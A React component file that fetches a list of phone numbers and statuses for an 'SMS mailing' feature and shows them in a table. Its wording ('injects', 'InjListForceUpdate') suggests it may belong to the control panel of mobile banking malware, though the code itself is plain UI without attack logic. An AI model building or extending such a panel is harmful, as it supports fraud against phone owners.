import React from 'react';
import DbRow from './dbRow';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';


class dbTable extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
          error: null,
          isLoaded: false,
          arrayFiles: []
        };
    }
    
    componentDidMount() {
        this.onLoadJson();
    }

    componentWillReceiveProps() {
        this.onLoadJson();
    }

    onLoadJson () {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"get_mailing_sms"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                }
                else {
                    this.setState({
                        isLoaded: true,
                        arrayFiles: result.numbers
                    });
                }
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading injects. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render () { 
        const Px70Width = {
            marginLeft: '5px',
            width: '1px',
            textAlign: 'center',
            fontSize: '20px'
        }

        const font26 = {
            fontSize: '22px',
            textAlign: 'center'
        }


        if (!this.state.isLoaded) {
            return <div class="load-4"><div class="ring-1"></div></div>
        }
        return (
            <React.Fragment>
                <table class="table table-striped table-hover">
                    <thead class="thead-light">

                      
                        <tr>
                        <th scope="col" style={Px70Width}></th>
                        <th scope="col" style={Px70Width}></th>
                        <th scope="col" style={Px70Width}></th>
                        </tr>
                    </thead>
                    <tbody>
                        {this.state.arrayFiles.map(item => (
                        <DbRow InjListForceUpdate={this.props.InjListForceUpdate} nums={item.nums} stat={item.stat}/>
                        ))}
                    </tbody>
                </table>
            </React.Fragment>
        );
    }

}

export default dbTable;